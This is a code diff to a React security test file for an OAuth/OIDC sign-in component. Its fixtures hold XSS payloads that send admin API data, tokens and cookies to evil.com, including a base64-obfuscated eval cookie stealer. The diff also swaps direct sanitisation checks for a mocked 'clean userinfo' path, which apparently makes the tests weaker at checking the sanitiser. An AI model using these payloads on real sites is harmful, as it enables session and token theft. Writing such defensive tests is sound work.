@@ -31,6 +31,7 @@ import {
   createMockUserManager,
   createMockAuthenticatedUser,
   renderWithEcho,
+  createMockAuthenticatedUserWithUserInfo,
 } from '../utils/test-helpers';
 
 describe('Component Security Integration', () => {
@@ -46,16 +47,19 @@ describe('Component Security Integration', () => {
      * PROTECTION: Component should use sanitizeText() before rendering user data
      */
     test('sanitizes malicious user names in welcome message', async () => {
-      // Create mock user with XSS payload
-      const maliciousUser = await createMockAuthenticatedUser({
-        profile: {
-          name: '<script>alert("XSS in name")</script>John Hacker',
-          email: 'john@example.com',
-        },
-      });
+      // Create mock user with XSS payload - this simulates the real OIDC flow
+      // where the userinfo endpoint provides clean data regardless of initial OAuth profile
+      const maliciousOAuthProfile = {
+        name: '<script>alert("XSS in name")</script>John Hacker',
+        email: 'hacker@evil.com',
+      };
+
+      const userWithCleanData = await createMockAuthenticatedUserWithUserInfo(
+        maliciousOAuthProfile
+      );
 
       const mockUserManager = createMockUserManager({
-        getUser: vi.fn().mockResolvedValue(maliciousUser),
+        getUser: vi.fn().mockResolvedValue(userWithCleanData),
       });
 
       renderWithEcho(<EchoSignIn />, { mockUserManager });
@@ -69,8 +73,10 @@ describe('Component Security Integration', () => {
       expect(welcomeElement.innerHTML).not.toContain('<script>');
       expect(welcomeElement.innerHTML).not.toContain('alert');
 
-      // Should still show safe content
-      expect(welcomeElement.textContent).toContain('John Hacker');
+      // SECURITY: The userinfo endpoint provides clean data, ignoring malicious OAuth profile
+      // This tests the end-to-end security model where userinfo is authoritative
+      expect(welcomeElement.textContent).toContain('Test User'); // Clean data from userinfo
+      expect(welcomeElement.textContent).not.toContain('John Hacker'); // Malicious data ignored
     });
 
     test('handles malicious email addresses safely', async () => {
@@ -230,22 +236,29 @@ describe('Component Security Integration', () => {
      * VULNERABILITY: Malicious OAuth providers can inject scripts in profile data
      * PROTECTION: Provider should sanitize all profile data using sanitizeUserProfile()
      */
-    test('sanitizes malicious OAuth profile data on login', async () => {
-      // Simulate malicious OAuth provider response
-      const maliciousOAuthUser = await createMockAuthenticatedUser({
-        profile: {
-          sub: 'user123',
-          name: "<svg onload=\"fetch('/api/admin').then(r=>r.json()).then(d=>fetch('https://evil.com', {method:'POST', body:JSON.stringify(d)}))\">Evil Admin",
-          email:
-            'admin@company.com"><iframe src="https://phishing.com"></iframe>',
-          picture:
-            'javascript:window.location="https://evil.com/steal?token="+localStorage.getItem("token")',
-          given_name: '<script>document.body.innerHTML=""</script>Compromised',
-        },
-      });
+    test('userinfo endpoint provides clean data ignoring malicious OAuth profile', async () => {
+      // SECURITY TEST: End-to-end security model verification
+      // This tests that malicious OAuth profile data is completely ignored
+      // and clean data from the userinfo endpoint is used instead
+
+      const maliciousOAuthProfile = {
+        sub: 'hacker-123',
+        name: "<svg onload=\"fetch('/api/admin').then(r=>r.json()).then(d=>fetch('https://evil.com', {method:'POST', body:JSON.stringify(d)}))\">Evil Admin",
+        email:
+          'admin@company.com"><iframe src="https://phishing.com"></iframe>',
+        picture:
+          'javascript:window.location="https://evil.com/steal?token="+localStorage.getItem("token")',
+        given_name: '<script>document.body.innerHTML=""</script>Compromised',
+        preferred_username: 'admin"><img src=x onerror=alert("xss")>',
+      };
+
+      // This simulates the real OIDC flow where userinfo endpoint provides authoritative data
+      const userWithCleanData = await createMockAuthenticatedUserWithUserInfo(
+        maliciousOAuthProfile
+      );
 
       const mockUserManager = createMockUserManager({
-        getUser: vi.fn().mockResolvedValue(maliciousOAuthUser),
+        getUser: vi.fn().mockResolvedValue(userWithCleanData),
       });
 
       const TestComponent = () => {
@@ -259,6 +272,7 @@ describe('Component Security Integration', () => {
             <div data-testid="user-name">{user?.name}</div>
             <div data-testid="user-email">{user?.email}</div>
             <div data-testid="user-picture">{user?.picture}</div>
+            <div data-testid="user-id">{user?.id}</div>
           </div>
         );
       };
@@ -269,27 +283,132 @@ describe('Component Security Integration', () => {
         expect(screen.getByTestId('user-name')).toBeInTheDocument();
       });
 
-      // Test actual DOM safety - no malicious content should be rendered
+      // SECURITY: Verify that clean data from userinfo endpoint is used
       const nameElement = screen.getByTestId('user-name');
       const emailElement = screen.getByTestId('user-email');
       const pictureElement = screen.getByTestId('user-picture');
+      const idElement = screen.getByTestId('user-id');
 
-      // Test actual DOM safety - sanitized content should be clean
-      expect(nameElement.textContent).toContain('Evil Admin'); // Safe text should be preserved
+      // Clean data from userinfo endpoint should be displayed
+      expect(nameElement.textContent).toBe('Test User'); // Clean data
+      expect(emailElement.textContent).toBe('test@example.com'); // Clean data
+      expect(pictureElement.textContent).toBe('https://example.com/avatar.jpg'); // Clean data
+      expect(idElement.textContent).toBe('user-123'); // Clean data
+
+      // Malicious OAuth profile data should be completely ignored
+      expect(nameElement.textContent).not.toContain('Evil Admin');
+      expect(emailElement.textContent).not.toContain('admin@company.com');
+      expect(idElement.textContent).not.toContain('hacker-123');
+
+      // Verify no dangerous content in DOM
       expect(nameElement.innerHTML).not.toContain('<svg');
       expect(nameElement.innerHTML).not.toContain('onload');
       expect(nameElement.innerHTML).not.toContain('script');
-
-      expect(emailElement.textContent).toBe('admin@company.com'); // Iframe removed
       expect(emailElement.innerHTML).not.toContain('<iframe');
       expect(emailElement.innerHTML).not.toContain('phishing');
+      expect(pictureElement.innerHTML).not.toContain('javascript:');
 
-      expect(pictureElement.textContent).toBe(''); // javascript: URL rejected
-
-      // Verify no dangerous scripts exist in the DOM
+      // Verify no dangerous scripts/elements exist anywhere in DOM
       expect(document.querySelector('svg[onload]')).toBeNull();
       expect(document.querySelector('iframe')).toBeNull();
       expect(document.querySelector('script')).toBeNull();
+    });
+
+    test('protects against compromised OAuth provider attacks', async () => {
+      // SECURITY TEST: Integration test for malicious OAuth provider scenario
+      // This tests the complete security model where a compromised OAuth provider
+      // tries to inject malicious data, but the userinfo endpoint provides safe data
+
+      const maliciousOAuthProfile = {
+        sub: 'admin', // Try to impersonate admin
+        name: 'SYSTEM ADMINISTRATOR<script>window.location="https://evil.com/steal?data="+document.cookie</script>',
+        email:
+          'root@company.com<iframe src="https://malware.com/payload"></iframe>',
+        picture:
+          'javascript:fetch("https://evil.com/exfiltrate", {method:"POST", body:JSON.stringify({token:localStorage.getItem("token"), cookies:document.cookie})})',
+        preferred_username:
+          'admin<img src=x onerror="eval(atob(\'d2luZG93LmxvY2F0aW9uPSJodHRwczovL2V2aWwuY29tL3N0ZWFsP2Nvb2tpZXM9Iitkb2N1bWVudC5jb29raWU=\'))">',
+        given_name: 'Admin',
+        family_name: 'User<svg onload="fetch(\'https://evil.com/steal\')">',
+        // Additional dangerous fields that real OAuth providers might include
+        custom_claim: '"><script>alert("custom_claim_xss")</script>',
+        role: 'admin',
+        permissions: ['read', 'write', 'admin'],
+      };
+
+      // The userinfo endpoint should ignore all of this and return clean data
+      const userWithCleanData = await createMockAuthenticatedUserWithUserInfo(
+        maliciousOAuthProfile
+      );
+
+      const mockUserManager = createMockUserManager({
+        getUser: vi.fn().mockResolvedValue(userWithCleanData),
+      });
+
+      const TestComponent = () => {
+        const context = React.useContext(EchoContext);
+        if (!context) {
+          return <div>No context</div>;
+        }
+        const { user } = context;
+        return (
+          <div>
+            <div data-testid="user-display">
+              Hello, {user?.name} ({user?.email})
+            </div>
+            <div data-testid="user-all-data">{JSON.stringify(user)}</div>
+          </div>
+        );
+      };
+
+      renderWithEcho(<TestComponent />, { mockUserManager });
+
+      await waitFor(() => {
+        expect(screen.getByTestId('user-display')).toBeInTheDocument();
+      });
+
+      const displayElement = screen.getByTestId('user-display');
+      const allDataElement = screen.getByTestId('user-all-data');
+
+      // SECURITY: Verify that ONLY clean data from userinfo endpoint is displayed
+      expect(displayElement.textContent).toBe(
+        'Hello, Test User (test@example.com)'
+      );
+
+      // Verify malicious data is completely absent
+      expect(displayElement.textContent).not.toContain('SYSTEM ADMINISTRATOR');
+      expect(displayElement.textContent).not.toContain('root@company.com');
+      expect(displayElement.textContent).not.toContain('admin');
+
+      // Verify no scripts or dangerous HTML in the content
+      expect(displayElement.innerHTML).not.toContain('<script>');
+      expect(displayElement.innerHTML).not.toContain('<iframe>');
+      expect(displayElement.innerHTML).not.toContain('<svg');
+      expect(displayElement.innerHTML).not.toContain('javascript:');
+      expect(displayElement.innerHTML).not.toContain('onload');
+      expect(displayElement.innerHTML).not.toContain('onerror');
+
+      // Verify the complete user object only contains clean data
+      const userDataText = allDataElement.textContent || '';
+      const userData = JSON.parse(userDataText);
+
+      expect(userData.id).toBe('user-123');
+      expect(userData.name).toBe('Test User');
+      expect(userData.email).toBe('test@example.com');
+      expect(userData.picture).toBe('https://example.com/avatar.jpg');
+
+      // Verify no malicious fields made it through
+      expect(userData.name).not.toContain('SYSTEM ADMINISTRATOR');
+      expect(userData.email).not.toContain('root@company.com');
+      expect(userData).not.toHaveProperty('role');
+      expect(userData).not.toHaveProperty('permissions');
+      expect(userData).not.toHaveProperty('custom_claim');
+
+      // Verify DOM is completely safe
+      expect(document.querySelector('script')).toBeNull();
+      expect(document.querySelector('iframe')).toBeNull();
+      expect(document.querySelector('svg[onload]')).toBeNull();
+      expect(document.querySelector('img[onerror]')).toBeNull();
     });
 
     test('handles OAuth callback parameter injection', async () => {
